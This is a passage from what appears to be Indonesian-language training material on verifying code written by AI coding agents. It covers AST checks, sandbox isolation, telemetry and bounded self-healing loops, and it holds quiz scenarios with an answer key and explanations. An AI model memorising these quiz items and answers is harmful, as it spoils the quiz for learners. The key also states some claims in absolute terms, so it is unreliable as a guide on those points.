    - C. Ganti LLM yang digunakan dengan model yang memiliki parameter lebih kecil agar kode yang dihasilkan lebih pendek.
    - D. Tingkatkan kapasitas hardware server staging menggunakan instans cloud yang memiliki clock speed CPU lebih tinggi.

12. **Skenario 2**: Dalam sebuah siklus migrasi database otomatis, agen coding secara persisten menghasilkan panggilan method `session.query(Model).get_or_404(id)` yang merupakan syntax usang dari dependensi versi lama yang sudah didegradasi pada library versi terbaru yang terpasang di sistem.
    Langkah preventif mana yang memberikan determinisme absolut tanpa bergantung pada perbaikan manual oleh pengembang?
    - A. Memasukkan seluruh dokumentasi dependensi versi baru setebal 1000 halaman ke dalam setiap prompt context window.
    - B. Pasang AST Deprecation Visitor yang membaca symbol table dari virtual environment terpasang; bila terdeteksi atribut usang, intercept code dan ganti secara otomatis menggunakan AST rewrite rule (*codemod*) sebelum kompilasi sandbox.
    - C. Turunkan (*downgrade*) versi dependensi pada repositori enterprise agar kompatibel dengan halusinasi LLM tersebut.
    - D. Hapus semua static type annotations dari file proyek agar interpreter tidak memeriksa fungsi tersebut.

13. **Skenario 3**: Trace telemetri pada OpenTelemetry collector menunjukkan anomali: sebuah coding agent terus melakukan regenerasi kode sebanyak 10 kali (max limit hit) pada fase self-healing, menyebabkan kegagalan build PR. Pesan kesalahan yang tercatat di trace span adalah `ImportError: cannot import name 'RateLimiter' from 'core.security'`. File `core/security.py` memang ada di repositori, tetapi kelas `RateLimiter` belum diimplementasikan di cabang (branch) tersebut.
    Mengapa agen gagal menyadari akar masalah ini secara mandiri dan bagaimana cara mengatasinya?
    - A. Agen kekurangan alokasi komputasi GPU untuk berpikir; solusi: gunakan multi-GPU cluster.
    - B. Model terjebak halusinasi karena informasi simbol lokal hilang dari konteks; solusi: ubah verifier untuk memancarkan pesan refleksi spesifik yang menyatakan bahwa simbol tidak ditemukan di AST repositori lokal beserta daftar simbol alternatif yang tersedia pada target file.
    - C. Masalah ini disebabkan oleh bug pada parser Python interpreter; solusi: restart daemon runner CI/CD.
    - D. Agen secara sengaja memalsukan dependency; solusi: hapus direktori `core.security` dari repositori.

---

### Kunci Jawaban & Evaluasi

1. **B** - Phantom dependency adalah istilah resmi untuk impor paket yang dihasilkan LLM yang sebenarnya tidak terpasang di sistem atau tidak terdaftar di package index resmi.
2. **B** - Parsing AST tidak mengeksekusi kode, sehingga sangat aman dari potensi eksekusi eksploitasi berbahaya dan sangat murah secara komputasi dibanding runtime execution.
3. **B** - OpenTelemetry yang digabungkan dengan konvensi semantik OpenInference/GenAI merupakan standar de facto observabilitas modern untuk AI Agents.
4. **C** - Semantic drift terjadi saat kode secara sintaksis dan runtime valid, tetapi menghasilkan output bisnis/domain yang salah.
5. **B** - Tanpa batas deterministik, loop refleksi akan menghabiskan kuota token dan memicu timeout pipeline tanpa garansi konvergensi solusi.
6. **B** - Shared context bias menyebabkan model mengulangi dan memvalidasi asumsi logikanya yang salah jika bertindak sebagai pembuat kode sekaligus pembuat penguji tanpa validasi independen.
7. **B** - Metrik ini merefleksikan secara akurat efisiensi sistem pemulihan: seberapa banyak iterasi dan biaya yang dibutuhkan hingga kode lolos validasi.
8. **C** - Standar pertahanan enterprise untuk eksekusi kode dinamis adalah ephemeral sandbox yang terisolasi penuh secara namespace, network, dan filesystem access.
9. **B** - Index SCIP/LSIF memetakan seluruh definisi dan referensi simbol secara akurat dari source tree sehingga grounding kontekstual menjadi deterministik.
10. **B** - LLM membutuhkan stack trace bersih, penunjuk baris spesifik, dan variabel pemicu kegagalan untuk dapat merekonstruksi logika penanganan boundary secara benar.
11. **B** - Verifikasi performa deterministik dengan benchmark assertion pada data uji sintetis adalah satu-satunya cara mencegah degradasi performa asimptotik sebelum commit.
12. **B** - Pemanfaatan AST Deprecation Visitor dan automated codemods menyelesaikan inkonsistensi versi secara instan dan deterministik pada level AST.
13. **B** - LLM tidak memiliki visibilitas atas ketiadaan simbol internal kecuali verification engine secara eksplisit memeriksa graf simbol dan memberikan umpan balik korektif terstruktur.

---

### 16. Summary

Implementasi *vibe-coding* pada level enterprise membutuhkan pergeseran paradigma dari *optimistic rapid prompting* menuju **Deterministic Telemetric Engineering**. Kecepatan komputasi AI generatif harus diimbangi dengan fondasi verifikasi tanpa kompromi (*zero-trust verification harness*).

1. **Deteksi Sebelum Eksekusi**: Validasi struktural berbasis **Abstract Syntax Tree (AST)** dan analisis simbolik (LSIF/SCIP) adalah lapisan pertahanan pertama yang murah, deterministik, dan aman untuk mengeliminasi impor halusinasi (*phantom dependencies*) sebelum kode menyentuh runtime.
2. **Isolasi Mutlak**: Lingkungan eksekusi uji coba (*sandbox*) wajib menerapkan isolasi ketat terhadap sistem operasi (Namespaces, cgroups, dan seccomp) untuk memitigasi eksekusi kode berbahaya atau kebocoran resource.
3. **Observabilitas Mendalam**: Instrumentasi terdistribusi menggunakan **OpenTelemetry** dan konvensi **OpenInference** mengubah proses coding agent dari *black-box* menjadi alur kerja yang dapat diukur, dianalisis degradasinya, dan dioptimasi biaya token serta latensinya.
4. **Siklus Koreksi Terkendali**: *Self-healing loops* harus beroperasi di bawah batasan deterministik (maksimum iterasi, token budgets, dan negative constraints injection) guna mencegah *infinite oscillation* dan *semantic drift* pada sistem produksi.